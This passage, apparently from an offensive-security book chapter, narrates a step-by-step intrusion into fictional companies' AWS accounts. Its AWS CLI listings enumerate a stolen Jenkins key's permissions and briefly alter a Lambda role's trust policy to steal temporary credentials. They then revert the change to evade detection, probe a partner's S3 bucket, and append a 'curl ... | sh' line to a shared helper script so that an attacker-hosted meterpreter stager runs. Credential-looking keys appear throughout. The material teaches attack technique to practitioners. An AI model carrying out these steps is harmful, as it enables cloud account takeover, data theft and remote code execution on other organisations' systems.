+<p>In <a href="#listing10-7" id="listinganchor10-7">Listing 10-7</a>, we chain a couple of AWS API calls to get the IAM username associated with these credentials, its attached policies, their latest versions, and finally their content.</p>
+<pre><code>root@Point1:~/# <b>vi ~/.aws/credentials</b>
+[jenkins]
+aws_access_key_id = AKIA55ZRK6ZS2XX5QQ4D
+aws_secret_access_key = 6yHF+L8+u7g7RmHcudlCqWIg0SchgT
+
+# get username
+root@Point1:~/# <b>aws iam get-user --profile jenkins</b>
+"UserName": "jenkins"
+
+# list attached policies
+root@Point1:~/# <b>aws iam list-attached-user-policies \</b>
+<b>--user-name=jenkins \</b>
+<b>--profile jenkins</b>
+
+"PolicyName": "jenkins-policy",
+"PolicyArn": "arn:aws:iam::aws:policy/jenkins-policy"
+
+<span epub:type="pagebreak" title="181" id="Page_181"/># get policy version
+root@Point1:~/# <b>aws iam iam get-policy \</b>
+<b>--policy-arn arn:aws:iam::886371554408:policy/jenkins-policy \</b>
+<b>--profile jenkins</b>
+
+"DefaultVersionId": "v4",
+
+# get policy content
+
+root@Point1:~/# <b>aws iam iam get-policy-version \</b>
+<b>--policy-arn arn:aws:iam::886371554408:policy/jenkins-policy \</b>
+<b>--version v4 \</b>
+<b>--profile jenkins</b>
+<var>--snip--</var>
+"Action": [
+        "iam:*",
+        "ec2:*",
+        "sts:*",
+        "lambda:*",
+         . . .
+         ],
+        "Resource": "*"
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing10-7">Listing 10-7</a>: Retrieving access rights granted to the Jenkins account</p>
+<p>Look at all those stars in the policy output. Stars. Stars everywhere. Literally. Jenkins has access to every AWS service used by MXR Ads, from IAM to Lambda and more. We finally have total and undisputed control over MXR Ads’ AWS account.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	In this scenario, we chose to leverage EC2 to take control over management tools, but other options were also possible: exploring S3 for cookbooks, Jenkins backups, Terraform state, VPN accounts, and so on. The same is true for GitHub repos, DynamoDB documents, and other services.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<h2 id="h1-501263c10-0003">Taking Over Lambda</h2>
+<p class="BodyFirst">We loop back to our initial goal that sparked this tangent adventure: impersonating the IAM role attached to the Lambda function <code>dmp-sync</code>, which copies data over to Gretsch Politico.</p>
+<p>Now that we have unlimited access to the IAM service, let’s explore this Lambda’s role (see <a href="#listing10-8" id="listinganchor10-8">Listing 10-8</a>).</p>
+<pre><code>root@Point1:~/# <b>export AWS_PROFILE=jenkins</b>
+root@Point1:~/# <b>aws iam get-role lambda-dmp-sync</b>
+ "RoleName": "dmp-sync",
+ "Arn": "arn:aws:iam::886371554408:role/dmp-sync",
+ "AssumeRolePolicyDocument": {
+     "Version": "2012-10-17",
+     "Statement": [{
+          "Effect": "Allow",
+          "Principal": {
+<span epub:type="pagebreak" title="182" id="Page_182"/>              "Service": "lambda.amazonaws.com"
+           },
+              "Action": "sts:AssumeRole"
+      }]
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing10-8">Listing 10-8</a>: The IAM role policy of the <code>lambda-dmp-sync</code> role</p>
+<p>The <code>AssumeRolePolicyDocument</code> property designates which entity is allowed to impersonate a given role. Notice that the only entity trusted to assume this role is the AWS Lambda service itself (<a href="http://lambda.amazonaws.com" class="LinkURL">lambda.amazonaws.com</a>). To properly impersonate this role, we need to register a new Lambda, assign it this new role, and execute whatever code we like. Alternatively, we could update the current Lambda’s code to do our bidding.</p>
+<p>A third option, and probably the easiest option, is to temporarily update the role’s policy to include the Jenkins user. This change cannot linger, as anyone executing a <code>terraform plan</code> in that precise window of time would notice the extra account and might raise an eyebrow or two. Therefore, we need to be swift. We’ll alter the “assume role” policy, generate temporary credentials that last 12 hours, and revert back to the original policy. In and out in less than a second.</p>
+<p>In <a href="#listing10-9" id="listinganchor10-9">Listing 10-9</a>, we save the current role policy in a file and sneak in the line <code>"AWS": "arn:aws:iam::886371554408:user/jenkins"</code> to add Jenkins as a trusted user.</p>
+<pre><code>{
+  "Version": "2012-10-17",
+  "Statement": [{
+     "Effect": "Allow",
+     "Principal": {
+        "Service": "lambda.amazonaws.com",
+        "AWS": "arn:aws:iam::886371554408:user/jenkins"
+     },
+     "Action": "sts:AssumeRole"
+  }]
+}</code></pre>
+<p class="CodeListingCaption"><a id="listing10-9">Listing 10-9</a>: An IAM role policy to allow Jenkins to impersonate the IAM role used by the Lambda</p>
+<p>We submit this new role policy and quickly issue the <code>assume-role</code> API call to get the temporary credentials to impersonate the <code>lambda-dmp-sync</code> role:</p>
+<pre><code>
+root@Point1:~/# <b>aws iam update-assume-role-policy \</b>
+<b>--role-name lambda-dmp-sync \</b>
+<b>--policy-document file://new_policy.json</b>
+
+root@Point1:~/# <b>aws sts assume-role \</b>
+<b>--role-arn arn:aws:iam::886371554408:user/lambda-dmp-sync \</b>
+<b>--role-session-name AWSCLI-Session \</b>
+<b>--duration-seconds 43200</b>
+
+<span epub:type="pagebreak" title="183" id="Page_183"/>"AccessKeyId": "ASIA44ZRK6WSZAFXRBQF",
+"SecretAccessKey": "nSiNoOEnWIm8h3WKXqgRG+mRu2QVN0moBSTjRZWC",
+"SessionToken": "FwoGZXIvYXdzEL///...
+"Expiration": "2019-12-12T10:31:53Z"</code></pre>
+<p>Good. These temporary credentials will stay valid for 12 hours, even though Jenkins is no longer in the trust policy. Finally, we restore the original policy to avoid any suspicion:</p>
+<pre><code>root@Point1:~/# <b>aws iam update-assume-role-policy \</b>
+<b>--role-name lambda-dmp-sync \</b>
+<b>--policy-document file://old_policy.json\</b>
+<b>--profile jenkins</b></code></pre>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	We will later focus on built-in alerts and detection measures in AWS, but since MXR Ads seems to be using Jenkins to issue IAM API calls, it is safe to assume that this type of operation will be drowned out in the regular daily noise.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>We load the new keys into our AWS CLI and proceed to explore Gretsch Politico’s bucket, gretsch-streaming-jobs (<a href="#listing10-10" id="listinganchor10-10">Listing 10-10</a>). This is the same one used by the <code>dmp-sync</code> Lambda, as we discovered earlier in the chapter.</p>
+<pre><code>root@Point1:~/# <b>vi ~/.aws/credentials</b>
+[dmp-sync]
+aws_access_key_id = ASIA44ZRK6WSZAFXRBQF
+aws_secret_access_key = nSiNoOEnWIm8h3WKXqgRG+mRu2QVN0moBSTjRZWC
+aws_session_token = FwoGZXIvYXdzEL//...
+
+root@Point1:~/# <b>aws s3api list-objects-v2 \</b>
+<b>--bucket gretsch-streaming-jobs \</b>
+<b>--profile dmp-sync &gt; list_objects_gp.txt</b>
+
+root@Point1:~/# <b>head list_objects_gp.txt</b>
+
+"Key": "rtb-bid-resp/2019/12/11/10/resp-0-141d08-ecedade-123...",
+"Key": "rtb-bid-resp/2019/12/11/10/resp-0-753a10-3e1a3cb-51c...",
+"Key": "rtb-bid-resp/2019/12/11/10/resp-0-561058-8e85acd-175...",
+"Key": "rtb-bid-resp/2019/12/11/10/resp-1-091bd8-135eac7-92f...",
+"Key": "rtb-bid-resp/2019/12/11/10/resp-1-3f1cd8-dae14d3-1fd...",
+--<var>snip</var>--</code></pre>
+<p class="CodeListingCaption"><a id="listing10-10">Listing 10-10</a>: A list of objects stored in the gretsch-streaming-jobs bucket</p>
+<p>MXR Ads seems to be giving away bid responses to GP, which tells them which video was displayed to a given cookie ID on a given website. There are also other key metrics that, oddly enough, many companies would consider sensitive material, such as raw logs of every bid request, campaign data of other clients . . . the list goes on.</p>
+<p><span epub:type="pagebreak" title="184" id="Page_184"/>The gretsch-streaming-jobs bucket is truly huge. It contains terabytes of raw data that we simply cannot process, nor do we wish to. GP is better equipped to do that. We’d better follow this trail of breadcrumbs and hope it leads us to the final cake.</p>
+<p>Amid this gigantic data lake, hidden under the all-too-tempting <code>helpers</code> key, we find some curious executables that were altered only a couple of weeks ago:</p>
+<pre><code>"Key": "helpers/ecr-login.sh",
+"LastModified": "2019-11-14T15:10:43.000Z",
+
+"Key": "helpers/go-manage",
+"LastModified": "2019-11-14T15:10:43.000Z",
+<var>--snip--</var></code></pre>
+<p>Interesting. Here we have executable objects that are likely executed on machines owned and operated by GP. This could very well be our ticket inside Gretsch Politico’s AWS account. Our Lambda role can, by definition, write to the gretsch-streaming-jobs bucket. The question is, was GP savvy enough to solely restrict the Lambda to the <code>rtb-bid-resp</code> subkeys? Let’s test it:</p>
+<pre><code>root@Point1:~/# <b>aws s3api put-object \</b>
+<b>--bucket gretsch-streaming-jobs \</b>
+<b>--key helpers/test.html --body test.html \</b>
+<b>--profile dmp-sync</b>
+
+"ETag": "\"051aa2040dafb7fa525f20a27f5e8666\""</code></pre>
+<p>No errors. Consider it an invitation to cross the border, folks! These helper scripts are probably fetched and executed by a GP resource. If we alter them, we can hijack the execution flow and call our custom stager, granting us a new shell on a GP component!</p>
+<p>We download <em>helpers/ecr-login.sh</em>, append a command to execute our custom meterpreter stager, and resubmit the file. As usual, the stager will be hosted in yet another fake bucket in our own AWS account, gretsch-helpers:</p>
+<pre><code>root@Point1:~/# <b>aws s3api get-object \</b>
+<b>--bucket gretsch-streaming-jobs\</b>
+<b>--key helpers/ecr_login.sh ecr-login.sh \</b>
+<b>--profile dmp-sync</b>
+
+root@Point1:~/# <b>echo "true || curl https://gretsch-helpers.s3.amazonaws.com/helper.sh |sh" &gt;&gt; ecr-login.sh</b>
+
+root@Point1:~/# <b>aws s3api put-object \</b>
+<b>--bucket gretsch-streaming-jobs \</b>
+<b>--key helpers/ecr-login.sh \</b>
+<b>--body ecr-login.sh \</b>
+<b>--profile dmp-sync</b></code></pre>
+<p><span epub:type="pagebreak" title="185" id="Page_185"/>And now we wait. We wait for a few hours. We wait until someone, somewhere, triggers our payload, if ever. After all, we have no guarantee that the <em>ecr-login</em> helper is indeed used. We didn’t even bother checking what it really did. Anyway, it’s too late now. Let’s cross our fingers and hope for the best.</p>
+<h2 id="h1-501263c10-0004">Resources</h2>
+<ul>
+<li>The documentation for AWS STS is at <a href="https://amzn.to/38j05GM" class="LinkURL">https://amzn.to/38j05GM</a>.</li>
+<li>For more on the power of AWS Lambda, see the talk “Kubernetes and the Path to Serverless” by Kelsey Hightower (Google staff), shown at KubeCon 2018: <a href="http://bit.ly/2RtothP" class="LinkURL">http://bit.ly/2RtothP</a><em>. </em>(Yes, you read that right—he works at Google.)</li>
+</ul>
+</section>
+</body></html>
